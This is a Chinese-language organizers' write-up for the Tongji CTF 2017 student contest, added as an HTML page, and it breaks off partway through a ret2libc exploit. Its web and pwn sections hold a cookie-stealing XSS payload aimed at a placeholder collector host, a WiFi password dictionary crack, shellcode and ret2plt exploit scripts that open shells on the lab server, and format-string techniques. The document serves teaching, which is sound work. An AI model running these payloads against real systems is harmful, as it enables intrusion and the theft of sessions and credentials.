+    inset 0 -12px 0 rgba(0, 0, 0, .05);
+}
+
+/* Multimarkdown Critic Blocks */
+.markdown-body .critic_mark {
+  background: #ff0;
+}
+
+.markdown-body .critic_delete {
+  color: #c82829;
+  text-decoration: line-through;
+}
+
+.markdown-body .critic_insert {
+  color: #718c00 ;
+  text-decoration: underline;
+}
+
+.markdown-body .critic_comment {
+  color: #8e908c;
+  font-style: italic;
+}
+
+.markdown-body .headeranchor {
+  font: normal normal 16px octicons-anchor;
+  line-height: 1;
+  display: inline-block;
+  text-decoration: none;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+}
+
+.headeranchor:before {
+  content: '\f05c';
+}
+
+.markdown-body .task-list-item {
+  list-style-type: none;
+}
+
+.markdown-body .task-list-item+.task-list-item {
+  margin-top: 3px;
+}
+
+.markdown-body .task-list-item input {
+  margin: 0 4px 0.25em -20px;
+  vertical-align: middle;
+}
+
+/* Media */
+@media only screen and (min-width: 480px) {
+  .markdown-body {
+    font-size:14px;
+  }
+}
+
+@media only screen and (min-width: 768px) {
+  .markdown-body {
+    font-size:16px;
+  }
+}
+
+@media print {
+  .markdown-body * {
+    background: transparent !important;
+    color: black !important;
+    filter:none !important;
+    -ms-filter: none !important;
+  }
+
+  .markdown-body {
+    font-size:12pt;
+    max-width:100%;
+    outline:none;
+    border: 0;
+  }
+
+  .markdown-body a,
+  .markdown-body a:visited {
+    text-decoration: underline;
+  }
+
+  .markdown-body .headeranchor-link {
+    display: none;
+  }
+
+  .markdown-body a[href]:after {
+    content: " (" attr(href) ")";
+  }
+
+  .markdown-body abbr[title]:after {
+    content: " (" attr(title) ")";
+  }
+
+  .markdown-body .ir a:after,
+  .markdown-body a[href^="javascript:"]:after,
+  .markdown-body a[href^="#"]:after {
+    content: "";
+  }
+
+  .markdown-body pre {
+    white-space: pre;
+    white-space: pre-wrap;
+    word-wrap: break-word;
+  }
+
+  .markdown-body pre,
+  .markdown-body blockquote {
+    border: 1px solid #999;
+    padding-right: 1em;
+    page-break-inside: avoid;
+  }
+
+  .markdown-body .progress,
+  .markdown-body .progress-bar {
+    -moz-box-shadow: none;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+  }
+
+  .markdown-body .progress {
+    border: 1px solid #ddd;
+  }
+
+  .markdown-body .progress-bar {
+    height: 22px;
+    border-right: 1px solid #ddd;
+  }
+
+  .markdown-body tr,
+  .markdown-body img {
+    page-break-inside: avoid;
+  }
+
+  .markdown-body img {
+    max-width: 100% !important;
+  }
+
+  .markdown-body p,
+  .markdown-body h2,
+  .markdown-body h3 {
+    orphans: 3;
+    widows: 3;
+  }
+
+  .markdown-body h2,
+  .markdown-body h3 {
+    page-break-after: avoid;
+  }
+}
+</style><title>official</title></head><body><article class="markdown-body"><div class="toc">
+<ul>
+<li><a href="#tongji-ctf-2017-writeup">Tongji CTF 2017 主办方writeup</a><ul>
+<li><a href="#0x00">0x00 前言</a></li>
+<li><a href="#0x01-misc">0x01 Misc</a><ul>
+<li><a href="#misc-100">Misc 100 这也是一道签到题</a></li>
+<li><a href="#misc-200-py">Misc 200 py交易</a></li>
+<li><a href="#misc-200">Misc 200 大新闻</a></li>
+<li><a href="#misc-200_1">Misc 200 有毒吧</a></li>
+<li><a href="#misc-200_2">Misc 200 月黑风高夜</a></li>
+</ul>
+</li>
+<li><a href="#0x02-crypto">0x02 Crypto</a><ul>
+<li><a href="#crypto-100-rsa">Crypto 100 RSA</a></li>
+<li><a href="#crypto-200-wannacry">Crypto 200 WANNACRY</a></li>
+<li><a href="#crypto-300">Crypto 300 感觉药丸</a></li>
+</ul>
+</li>
+<li><a href="#0x03-web">0x03 Web</a><ul>
+<li><a href="#web-100-xinsaisai">Web 100 这是一道XinSaiSai的题目</a></li>
+<li><a href="#web-200">Web 200 这是一道很难的题目</a></li>
+</ul>
+</li>
+<li><a href="#0x04-pwn">0x04 Pwn</a><ul>
+<li><a href="#pwn-100">Pwn 100 这也叫缓冲区溢出？</a></li>
+<li><a href="#pwn-200">Pwn 200 这还是缓冲区溢出？</a></li>
+<li><a href="#pwn-300-c">Pwn 300 C语言超级程序设计</a></li>
+<li><a href="#pwn-400-c-">Pwn 400 C语言-还有这种操作-程序设计</a></li>
+<li><a href="#pwn-500">Pwn 500 ？？？？？</a></li>
+</ul>
+</li>
+<li><a href="#0x05-reverse">0x05 Reverse</a><ul>
+<li><a href="#reverse-100">Reverse 100 这是一道签到题</a></li>
+<li><a href="#reverse-200-netten">Reverse 200 .NETTEN.</a></li>
+<li><a href="#reverse-300-hijack">Reverse 300 Hijack</a></li>
+<li><a href="#reverse-400-quanter">Reverse 400 Quanter</a></li>
+<li><a href="#reverse-500-i-wrote-python">Reverse 500 I wrote Python</a></li>
+<li><a href="#reverse-500-vmp">Reverse 500 VMP</a></li>
+<li><a href="#1allpy">附录1：all.py</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+<h1 id="tongji-ctf-2017-writeup"><a name="user-content-tongji-ctf-2017-writeup" href="#tongji-ctf-2017-writeup" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>Tongji CTF 2017 主办方writeup</h1>
+<h2 id="0x00"><a name="user-content-0x00" href="#0x00" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>0x00 前言</h2>
+<p>比赛期间有一些同学来问为什么<code>Web</code>题这么少，后面还有没有<code>Web</code>的，向这些同学表示歉意。本次比赛偏向于二进制，这是因为我们的出题人搞二进制的(bu)多(hui)一(wai)些(bu)。这里我们祝愿下一届比赛的出题人们把题目出的全面一些。</p>
+<p>校内赛的难度把握也是一个值得讨论的问题。既要对新人友好，又要略带挑战；既要帮助入门，又要帮助大家走的稍远一些。不过，这也仅仅是一场比赛而已，大家以后在社团里多交流就会一起进步的。</p>
+<p>注：</p>
+<ul>
+<li>许多题目解法不止一种，本<code>writeup</code>仅给出一种参考</li>
+<li>另，建议知其然知其所以然</li>
+<li>欢迎大家指出错误</li>
+</ul>
+<h2 id="0x01-misc"><a name="user-content-0x01-misc" href="#0x01-misc" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>0x01 Misc</h2>
+<h3 id="misc-100"><a name="user-content-misc-100" href="#misc-100" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>Misc 100 这也是一道签到题</h3>
+<pre><code>题目：作为 misc 的签到题，想想还有点小骄傲呢。
+
+LS4uIC0tLS0tIC0uLS0gLS0tIC4uLSAtLi0gLS4gLS0tLS0gLi0tIC0uLiAtLS0gLSAuLi4uLSAtLiAtLi4gLS4uIC4tIC4uLi4uIC4uLi4=
+</code></pre>
+
+<p><code>Misc</code>是新人入门CTF最好的方式。<code>Base64</code>编码则更是<code>Misc</code>中用户体验不错的类型。</p>
+<pre><code>LS4uIC0tLS0tIC0uLS0gLS0tIC4uLSAtLi0gLS4gLS0tLS0gLi0tIC0uLiAtLS0gLSAuLi4uLSAtLiAtLi4gLS4uIC4tIC4uLi4uIC4uLi4=
+</code></pre>
+
+<p>找一个在线<code>Base64</code>解码：</p>
+<pre><code>-.. ----- -.-- --- ..- -.- -. ----- .-- -.. --- - ....- -. -.. -.. .- ..... ....
+</code></pre>
+
+<p>结果基本可以确定是<code>摩尔斯电码</code>，解码得：</p>
+<pre><code>D0YOUKN0WDOT4NDDA5H
+</code></pre>
+
+<p>(do you know dot and dash)</p>
+<h3 id="misc-200-py"><a name="user-content-misc-200-py" href="#misc-200-py" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>Misc 200 py交易</h3>
+<pre><code>题目：
+def show_me_flag():
+    print(&quot;\n&quot;)
+    print(&quot;    There are always some people and ideals&quot;)
+    print(&quot;      for whom and which we strive, endure and persist&quot;)
+    print(&quot;      when isolated. &quot;)
+    print(&quot;    That is why we struggle to our feet&quot;)
+    print(&quot;      and refuse to give up.&quot;)
+    print(&quot;    So, good luck :)&quot;)
+    print(&quot;\n&quot;)
+
+def show_me_flag2():
+    print(&quot;    To be or not to be, &quot;)
+    print(&quot;      that is a question.&quot;)
+    print(&quot;\n&quot;)
+
+def show_me_flag3():
+    print(&quot;    Youth is not a time of life.&quot;)
+    print(&quot;      It is a state of mind.&quot;)
+    print(&quot;      It is not a matter of rosy cheeks, &quot;)
+    print(&quot;        red lips and supple knees.&quot;)
+    print(&quot;      It is a matter of the will, &quot;)
+    print(&quot;        a quality of the imagination, a vigor of the emotions&quot;)
+    print(&quot;      It is the freshness of the deep springs of life.&quot;)
+    print(&quot;\n&quot;)
+
+def main():
+    show_me_flag()
+    show_me_flag2()
+    show_me_flag3()
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+
+<p>考查<code>zip伪加密</code>及<code>python字节码隐写</code>。</p>
+<p>拿到zip文件发现有密码，题面没有给出密码或者爆破密码的意思，判断可能是伪加密。找到图中位置将<code>09</code>改为<code>00</code>，就可以成功提取出<code>.pyc</code>：</p>
+<p><img alt="" src="images/fake-zip.png" /></p>
+<p>之后用python3.6运行发现输出与题目给出的一模一样，考虑可能不是源码的问题。结合python3.6的字节码很整齐这个特点，怀疑是pyc隐写。参考<code>http://www.freebuf.com/sectool/129357.html</code>可从字节码中提取出flag：</p>
+<p><img alt="" src="images/fake-pyc.png" /></p>
+<p>由于3.6版本的python字节码很整齐，也可以考虑自己手动去编译源码、对比。</p>
+<p>(踏破铁鞋无觅处)</p>
+<h3 id="misc-200"><a name="user-content-misc-200" href="#misc-200" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>Misc 200 大新闻</h3>
+<pre><code>题目：“近日，安全研究员 MathyVanhoef 发现 WPA2 协议层中存在逻辑缺陷，几乎所有支持Wi-Fi的设备（包括但不限于Android, Linux, Apple,Windows, OpenBSD, MediaTek, Linksys）都面临威胁，其传输的数据存在被嗅探、篡改的风险。攻击者可获取WiFi网络中的数据信息，如信用卡、邮件、账号、照片等，危害巨大。”
+
+oblivi0n看着眼前的加密wifi，默默打开了Wireshark...
+
+Flag格式：tj{wifi密码}
+</code></pre>
+
+<p>考查基础的wifi密码字典破解。</p>
+<p>题目描述看起来很高端，其实是障眼法：）</p>
+<p>直接把数据包导进<code>aircrack-ng</code>，找个字典暴力破解就可以。</p>
+<p>这个题的目的是提醒大家，wifi密码尽量设置复杂一些。否则不仅会被人蹭网，黑客也可以趁机搞事情，比如看看和他共用一个wifi的电脑有没有漏洞之类的。</p>
+<pre><code class="bash">aircrack-ng wifi.cap -w dic.txt
+</code></pre>
+
+<p>flag：tj{11223344}</p>
+<h3 id="misc-200_1"><a name="user-content-misc-200_1" href="#misc-200_1" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>Misc 200 有毒吧</h3>
+<pre><code>题目：我怎么总感觉背后有人在盯着我的电脑，总感觉有人知道我在输入什么。。。
+</code></pre>
+
+<p>考查基础的传输协议分析。</p>
+<p>针对USB键盘的抓包。USB协议的数据部分在<code>Leftover Capture Data</code>域，把它导出成一个文件：</p>
+<pre><code class="bash">tshark -r xxxxxxx.pcap -T fields -e usb.capdata &gt; keyboards.txt
+</code></pre>
+
+<p>记录与按键之间的对应关系参考<code>http://www.usb.org/developers/hidpage/Hut1_12v2.pdf</code>。</p>
+<p>注意<code>02</code>开头的记录代表同时按住<code>Shift+对应按键</code>，比如<code>02000F...</code>代表<code>shift+l</code>，输出的是大写的<code>L</code>。</p>
+<p>写个脚本跑一下：</p>
+<pre><code class="python">KEY_CODES = {
+    0x04:['a', 'A'],
+    0x05:['b', 'B'],
+    0x06:['c', 'C'],
+    0x07:['d', 'D'],
+    0x08:['e', 'E'],
+    0x09:['f', 'F'],
+    0x0A:['g', 'G'],
+    0x0B:['h', 'H'],
+    0x0C:['i', 'I'],
+    0x0D:['j', 'J'],
+    0x0E:['k', 'K'],
+    0x0F:['l', 'L'],
+    0x10:['m', 'M'],
+    0x11:['n', 'N'],
+    0x12:['o', 'O'],
+    0x13:['p', 'P'],
+    0x14:['q', 'Q'],
+    0x15:['r', 'R'],
+    0x16:['s', 'S'],
+    0x17:['t', 'T'],
+    0x18:['u', 'U'],
+    0x19:['v', 'V'],
+    0x1A:['w', 'W'],
+    0x1B:['x', 'X'],
+    0x1C:['y', 'Y'],
+    0x1D:['z', 'Z'],
+    0x1E:['1', '!'],
+    0x1F:['2', '@'],
+    0x20:['3', '#'],
+    0x21:['4', '$'],
+    0x22:['5', '%'],
+    0x23:['6', '^'],
+    0x24:['7', '&amp;'],
+    0x25:['8', '*'],
+    0x26:['9', '('],
+    0x27:['0', ')'],
+    0x28:['\n'],
+    0x2C:[' '],
+    0x2D:['-', '_'],
+    0x2E:['=', '+'],
+    0x2F:['[', '{'],
+    0x30:[']', '}'],
+    0x33:[';', ':'],
+    0x38:['/', '?'],
+    0x37:['.', '&gt;'],
+    0x2b:'[TAB]'
+}
+datas = open('keyboard.txt').read().split('\n')[:-1]
+output = ''
+for data in datas:
+    shift = int(data.split(':')[0], 16) / 2
+    key = int(data.split(':')[2], 16)
+    if key == 0:
+    continue
+    output += KEY_CODES[key][shift]
+print output
+</code></pre>
+
+<p><img alt="" src="images/usb.jpg" /></p>
+<p>(Logitech USB Listener)</p>
+<h3 id="misc-200_2"><a name="user-content-misc-200_2" href="#misc-200_2" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>Misc 200 月黑风高夜</h3>
+<pre><code>题目：听说这是嘉定的晚上。。
+</code></pre>
+
+<p>考查图像隐写术。</p>
+<p>用StegSolve打开图片，在该通道下可以看到清晰的二维码，扫描后得解：</p>
+<p><img alt="" src="images/LBS-01.png" /></p>
+<p>（招财进宝，我爱莹草）</p>
+<h2 id="0x02-crypto"><a name="user-content-0x02-crypto" href="#0x02-crypto" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>0x02 Crypto</h2>
+<h3 id="crypto-100-rsa"><a name="user-content-crypto-100-rsa" href="#crypto-100-rsa" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>Crypto 100 RSA</h3>
+<pre><code>题目：杨老师：将大整数分解为质因数是攻克RSA加密的核心。今天的作业很简单，求这个98位数的最大质因数：
+
+21949311347305581797160582529498169526027487167294416984481778350712846563483858308761365244743101
+</code></pre>
+
+<p>打开<code>www.factordb.com</code>，直接输入需要分解的大整数就能看见结果。</p>
+<p>flag: tj{5527278404454199535821801}</p>
+<h3 id="crypto-200-wannacry"><a name="user-content-crypto-200-wannacry" href="#crypto-200-wannacry" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>Crypto 200 WANNACRY</h3>
+<pre><code>题目：If you WANNACRY, cry on my shoulders....
+</code></pre>
+
+<p>考查密码学基础。</p>
+<p>灵感来源于<br />
+<code>http://stackoverflow.com/questions/3154998/pycrypto-problem-using-aesctr</code>。</p>
+<p><code>AES-CTR</code>理论上是很安全的，但是如果按照这样的写法对<code>每16个字符</code>都使用<code>一样的key</code>，则可以进行<code>已知明文攻击</code>。</p>
+<p>被加密文件是<code>wmv</code>，也就是说无论视频的内容如何，文件头都是<code>3026B2758E66CF11A6D900AA0062CE6C</code>。</p>
+<p>只要将明文的文件头与密文的文件头进行一次<code>xor</code>运算，就能得到<code>AES-CTR的密钥</code>。</p>
+<p>这里需要一定的脑洞。不过文件结尾大量出现重复的<code>ce90 5584 2a72 961e 6efb 6cba b947 7544</code>，其实已经把key暴露出来了。</p>
+<p>解密即可，视频中的内容就是flag。</p>
+<pre><code class="python">from itertools import *
+
+keystream = [0xCE,0x90,0x55,0x84,0x2A,0x72,0x96,0x1E,0x6E,0xFB,0x6C,0xBA,0xB9,0x47,0x75,0x44]
+
+cipher = open('flag.wmv.enc','rb').read()
+plain = open('solved.wmv','wb')
+
+for i,j in zip( cipher , cycle(keystream) ):
+    plain.write( chr(i ^ j) )
+</code></pre>
+
+<p><img alt="" src="images/misc-wmv-flag.png" /></p>
+<p>(Awesome Windows media)</p>
+<h3 id="crypto-300"><a name="user-content-crypto-300" href="#crypto-300" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>Crypto 300 感觉药丸</h3>
+<pre><code>题目：一觉醒来沈老师的作业变成了这样，还怎么拿优？
+</code></pre>
+
+<p>考查替换密码。</p>
+<p>如果直接用网页打开txt的话，会因为编码问题跳出一串不知所云的乱码，据说很多同学就是卡在了这里。</p>
+<p>把文件保存下来，编码改成<code>ANSI/GBK</code>就能看到一篇很有特点的文章了。</p>
+<p><img alt="" src="images/rain.jpg" /></p>
+<p>替换密码，26个雨字头的汉字对应26个字母。</p>
+<p>词频统计之后可以判断出<code>靄=e</code>，然后结合英语语法和密码学里讲过的字母出现频率可以将文章还原出来。</p>
+<p>这里向大家说声抱歉，后台设置的flag打错了一个字符导致一开始很多同学没有成功提交flag，后来进行了修复。</p>
+<p>flag: tj{substitudeisnotsafe}</p>
+<h2 id="0x03-web"><a name="user-content-0x03-web" href="#0x03-web" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>0x03 Web</h2>
+<h3 id="web-100-xinsaisai"><a name="user-content-web-100-xinsaisai" href="#web-100-xinsaisai" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>Web 100 这是一道XinSaiSai的题目</h3>
+<pre><code>题目：某无聊管理员在后台默默窥屏中。千万别输入什么见不得人的东西，他肯定会点开偷偷看哦~
+
+http://10.10.175.209:11001/tj-web01/
+</code></pre>
+
+<p>考查基础的<code>XSS</code>知识。</p>
+<p>题目其实有提示<code>XSS</code>的（<code>XinSaiSai</code>），另外题面描述管理员会点开看也是暗示可能存在<code>存储型XSS</code>。</p>
+<p>首先在一台具有<code>能够被赛题服务器访问到的IP</code>的机器上开一个<code>SimpleHTTPServer</code>：</p>
+<pre><code>python -m SimpleHTTPServer 80
+</code></pre>
+
+<p>接着在赛题页面输入用户名如下，密码随意：</p>
+<pre><code class="javascript">&lt;script&gt;window.open(&quot;http://xxx.xxx.xxx.xxx/&quot; + document.cookie)&lt;/script&gt;
+</code></pre>
+
+<p><img alt="" src="images/web100-xss-login.png" /></p>
+<p>查看服务器日志：</p>
+<p><img alt="" src="images/web100-xss-flag.png" /></p>
+<p>如果没有上述服务器，也可以使用在线XSS平台，或者把自己的电脑暂时设置为宿舍路由器的DMZ主机。</p>
+<p>(Scripting of Cross Site)</p>
+<h3 id="web-200"><a name="user-content-web-200" href="#web-200" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>Web 200 这是一道很难的题目</h3>
+<pre><code>题目：你听说过 PHP 吗？
+
+http://10.10.175.209:11002/
+</code></pre>
+
+<p>考查获取网站备份文件意识及<code>PHP 0e</code>安全隐患知识。</p>
+<p>右键查看注释之后发现存在一个<code>tj761306263</code>的用户名，输入后跳转到<code>login.php</code>，提示无法登陆。</p>
+<p><img alt="" src="images/html.jpg" /></p>
+<p>一番猜测之后发现<code>login.php</code>存在一个备份文件可以访问：<code>http://10.10.175.209:11002/.login.php.swo</code></p>
+<p><img alt="" src="images/swo.jpg" /></p>
+<p>在源码中发现一个<code>==</code>可以利用。</p>
+<p>PHP在处理字符串时，如果使用<code>!=</code>或<code>==</code>来进行比较，则它把每一个以<code>0E</code>开头的值都解释为<code>0</code>。如果两个不同的密码经过哈希以后，其哈希值都是以<code>0E+纯数字</code>的结构，那么PHP将会认为他们相同，都是<code>0</code>。</p>
+<p>对<code>tj761306263</code>进行哈希之后，发现它的MD5值正好符合这一条件：</p>
+<p><img alt="" src="images/md5.jpg" /></p>
+<p>输入另一个哈希后为<code>0E</code>开头的字符串，比如<code>240610708</code>或者<code>QNKCDZO</code>，都可以拿到flag。</p>
+<p>如果能找到泄漏的备份文件的话，这题会容易很多很多。在现实对Web系统的渗透测试中，这也是一个重要的检查点。</p>
+<p>(Dark Magic Named 0E)</p>
+<h2 id="0x04-pwn"><a name="user-content-0x04-pwn" href="#0x04-pwn" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>0x04 Pwn</h2>
+<h3 id="pwn-100"><a name="user-content-pwn-100" href="#pwn-100" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>Pwn 100 这也叫缓冲区溢出？</h3>
+<pre><code>题目：仿佛听到了莫里斯杠铃般的笑声。。。
+
+nc 10.10.175.209 10001
+</code></pre>
+
+<p>考查最基本的栈溢出覆盖变量。</p>
+<p>IDA打开程序，对<code>Kid()</code>函数F5：</p>
+<p><img alt="" src="images/pwn100-ida.png" /></p>
+<p>发现需要将输入缓冲区上方的<code>int v5</code>覆盖为<code>xtpa</code>，根据图中的栈偏移计算需要输入的字符数量：</p>
+<pre><code>0x21c - 0x118 = 260
+</code></pre>
+
+<p>再结合小端序，最后</p>
+<p><img alt="" src="images/pwn100-pwn.png" /></p>
+<p>(welcome to the real world my kid)</p>
+<h3 id="pwn-200"><a name="user-content-pwn-200" href="#pwn-200" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>Pwn 200 这还是缓冲区溢出？</h3>
+<pre><code>题目：嗯，听说你很厉害。。。
+
+nc 10.10.175.209 10002
+</code></pre>
+
+<p>考查格式化字符串漏洞的最基本利用。</p>
+<p>IDA打开程序，对<code>Kid()</code>函数F5：</p>
+<p><img alt="" src="images/pwn200-kid.png" /></p>
+<p>发现图中<code>printf</code>存在格式化字符串漏洞。再看一下<code>readFile()</code>：</p>
+<p><img alt="" src="images/pwn200-readfile.png" /></p>
+<p>是用来把flag读入内存的。</p>
+<p>接下来就是寻找当执行<code>call printf</code>时栈顶距flag所在字符数组的偏移。</p>
+<p>使用gdb调试发现，程序会把flag首地址存储在一个指针变量中，该变量距<code>printf</code>栈顶为6个偏移（由于该指针变量在代码中其他地方并未使用，所以仅仅使用IDA做反编译静态分析是看不到的。当然也可以直接通过打印栈内容来获得flag，但是由于程序限制了最多输入6个字符，所以需要多次拼凑<code>%*$x</code>之类的格式化字符串才可以）：</p>
+<p><img alt="" src="images/pwn200-gdb-point.png" /></p>
+<p><img alt="" src="images/pwn200-gdb-off.png" /></p>
+<p>所以最终可以获得flag：</p>
+<p><img alt="" src="images/pwn200-pwn.png" /></p>
+<p>关于格式化字符串漏洞可以参考：<code>http://bobao.360.cn/learning/detail/3654.html</code>。</p>
+<p>(Behind every great fortune there is a crime)</p>
+<h3 id="pwn-300-c"><a name="user-content-pwn-300-c" href="#pwn-300-c" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>Pwn 300 C语言超级程序设计</h3>
+<pre><code>题目：完，看来遇上大灰阔了。
+
+nc 10.10.175.209 10003
+</code></pre>
+
+<p>考查最基本的传入shellcode获取shell。</p>
+<p>IDA中直接对<code>Kid()</code>函数F5，发现失败：</p>
+<p><img alt="" src="images/pwn300-f5.png" /></p>
+<p>换到反汇编界面看一下：</p>
+<p><img alt="" src="images/pwn300-disasm.png" /></p>
+<p>发现程序先要求输入一段字符，然后竟然有<code>call eax</code>，说明把输入的东西当做一段指令执行。</p>
+<p>用gdb-peda看一下程序的漏洞缓解措施：</p>
+<p><img alt="" src="images/pwn300-checksec.png" /></p>
+<p><code>N^X</code>保护没有打开，说明可以直接传入shellcode执行。且<code>CANARY</code>打开，说明不太容易通过覆盖返回地址来达到劫持控制流的目的。到<code>www.exploit-db.com/</code>随便找一个短一些的shellcode，用<code>zio</code>写一个脚本：</p>
+<pre><code class="python">#!/usr/bin/env python
+
+from zio import *
+
+IP = &quot;10.10.175.209&quot;
+port = 10003
+
+shellcode = &quot;\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;
+conn = zio((IP, port))
+#conn = zio(&quot;./pwn300&quot;)
+conn.writeline(shellcode)
+conn.interact()
+</code></pre>
+
+<p>成功获得shell，发现当前目录下有flag，cat打开：</p>
+<p><img alt="" src="images/pwn300-pwn.png" /></p>
+<p>(never guess gin&rsquo;s thoughts)</p>
+<h3 id="pwn-400-c-"><a name="user-content-pwn-400-c-" href="#pwn-400-c-" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>Pwn 400 C语言-还有这种操作-程序设计</h3>
+<pre><code>题目：停车！这不是去幼儿园的车！
+
+nc 10.10.175.209 10004
+</code></pre>
+
+<p>考查使用<code>ret2plt</code>绕过<code>N^X</code>限制。</p>
+<p>IDA F5看一下程序：</p>
+<p><img alt="" src="images/pwn400-f5.png" /></p>
+<p><code>scanf</code>存在栈溢出。并且注意到程序的<code>.plt</code>表中竟然有<code>system</code>函数：</p>
+<p><img alt="" src="images/pwn400-f5-system.png" /></p>
+<p>用gdb-peda看一下开了哪些保护措施：</p>
+<p><img alt="" src="images/pwn400-checksec.png" /></p>
+<p>发现<code>N^X</code>打开，但<code>PIE</code>没有打开。暂时不考虑传入shellcode到栈上。又由于目标环境的基址随机化是否打开以及<code>libc</code>库版本均不可知，考虑调用<code>.plt</code>中的<code>system</code>函数并为其传入一个<code>sh</code>字符串做参数获得shell。那么哪里有<code>sh</code>呢？在gdb-peda中<code>find sh</code>一下，发现<code>Small fish</code>最后就是<code>sh</code>（即<code>0x80485db</code>处）：</p>
+<p><img alt="" src="images/pwn400-sh.png" /></p>
+<p>再看一下<code>system@plt</code>的地址：</p>
+<p><img alt="" src="images/pwn400-system.png" /></p>
+<p>最后用gdb调试计算一下需要多少填充字节才能够覆盖到函数返回地址。</p>
+<p>最终可以有以下exploit脚本：</p>
+<pre><code class="python">#!/usr/bin/env python
+
+from zio import *
+
+IP = &quot;10.10.175.209&quot;
+port = 10004
+
+shellcode = 'A' * 272 + '\x80\x83\x04\x08' + 'AAAA' + '\xdb\x85\x04\x08\n'
+
+conn = zio((IP, port))
+#conn = zio(&quot;./pwn200&quot;)
+conn.write(shellcode)
+conn.interact()
+</code></pre>
+
+<p>成功获得shell并得到flag：</p>
+<p><img alt="" src="images/pwn400-pwn.png" /></p>
+<p>(hahahahahahahaha you must be genius)</p>
+<h3 id="pwn-500"><a name="user-content-pwn-500" href="#pwn-500" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>Pwn 500 ？？？？？</h3>
+<pre><code>题目：:P
+
+nc 10.10.175.209 10005
+</code></pre>
+
+<p>考查利用<code>ret2libc</code>绕过<code>N^X</code>及格式化字符串漏洞泄露<code>libc</code>库地址信息。</p>
+<p>IDA F5打开：</p>
+<p><img alt="" src="images/pwn500-f5.png" /></p>
+<p>发现同上题相似，还是一个<code>scanf</code>的栈溢出，不过这次没有了隐含的<code>sh</code>字符串以及<code>system@plt</code>，却多了一个<code>printf</code>的格式化字符串漏洞。</p>
+<p>同样使用gdb-peda查看保护措施：</p>
+<p><img alt="" src="images/pwn500-checksec.png" /></p>
+<p>发现依然只开启了<code>N^X</code>，但是目标环境下可能开启了<code>ASLR</code>。这里考虑调用<code>libc</code>中的<code>system</code>函数获得shell，但是需要首先用格式化字符串漏洞获得目标环境下<code>system</code>加载的内存地址。由于程序运行一次只能输入一次，且有可能存在<code>ASLR</code>，所以我们要想办法让<code>Kid</code>函数运行两次：</p>
+<p>第一次输入目的：泄露<code>libc</code>库地址，并控制返回地址返回到<code>call Kid</code>上；</p>
+<p>然后借助第一次输入后程序返回的<code>libc</code>地址计算<code>system</code>的地址。可是<code>sh</code>字符串上哪里找呢？其实<code>libc</code>库中也有，我们在获得<code>libc</code>的版本及某一函数地址后，其他的地址均可以通过偏移计算出；</p>
+<p>第二次输入目的：构造<code>system("sh")</code>，获得shell。</p>
+<p>下面是具体的过程：</p>
+<p>根据Linux下<code>ELF</code>文件的加载过程，<code>__libc_start_main</code>函数最终调用<code>main</code>函数。所以<code>main</code>函数结束后会返回到<code>__libc_start_main</code>，那么根据汇编中<code>call</code>指令特性，<code>__libc_start_main</code>中下一条指令地址会被压入栈。</p>
+<p>我们在具有格式化字符串漏洞的<code>printf</code>处下断点，看栈上内容：</p>
+<p><img alt="" src="images/pwn500-gdb-stack1.png" /></p>
+<p>发现偏移量为<code>83</code>处存储了<code>__libc_start_main</code>中下一条指令地址。</p>
+<p><img alt="" src="images/pwn500-gdb-stack2.png" /></p>
+<p>可以先验证一下是否是这样：</p>
+<p><img alt="" src="images/pwn500-seeaddr.png" /></p>
+<p>可以发现两次均成功，但地址不同，这说明目标环境开启了<code>ASLR</code>。但是注意到该程序为<code>32位</code>，所以<code>ASLR</code>仅仅会把地址的中间<code>12bit</code>随机化，最后的<code>12bit</code>是保持不变的。据此我们可以判断出目标环境<code>libc库</code>版本。可以使用在线的<code>http://libcdb.com/</code>查询，也可以使用<code>KITCTF</code>开发的<code>libc-database</code>：<code>https://github.com/niklasb/libc-database</code>查询。本文使用后者查询：</p>
+<p>根据尾号<code>637</code>查版本并获取对应版本库中的<code>system函数</code>和<code>/bin/sh</code>偏移：</p>
+<p><img alt="" src="images/pwn500-libc.png" /></p>
+<p>发现有两个结果，测试后发现后一个符合目标环境特征。</p>
+<p>需要注意的是，这个版本的<code>libc</code>中的<code>/bin/sh</code>首地址恰好带有<code>0x0b</code>，而<code>scanf</code>遇到<code>0x0b</code>会截断，所以这里要稍微变通一下，只取<code>/bin/sh</code>中的<code>sh</code>字符串即可。</p>
+<p>至此，万事俱备。看一下<code>call Kid</code>指令地址，用来做二次调用：</p>
+<p><img alt="" src="images/pwn500-kidaddr.png" /></p>
+<p>最终的exploit为：</p>
+<pre><code class="python">#!/usr/bin/env python
+
+from zio import *
+
+IP = &quot;10.10.175.209&quot;
+port = 10005
+
+libcRetOff = 0x18637 
+systemOff = 0x0003a940
+shellOff = 0x159010
+shellcode1 = 'A' * 267 + '\xdb\x85\x04\x08'
+
+conn = zio((IP, port))
+#conn = zio(&quot;./pwn400&quot;)
+
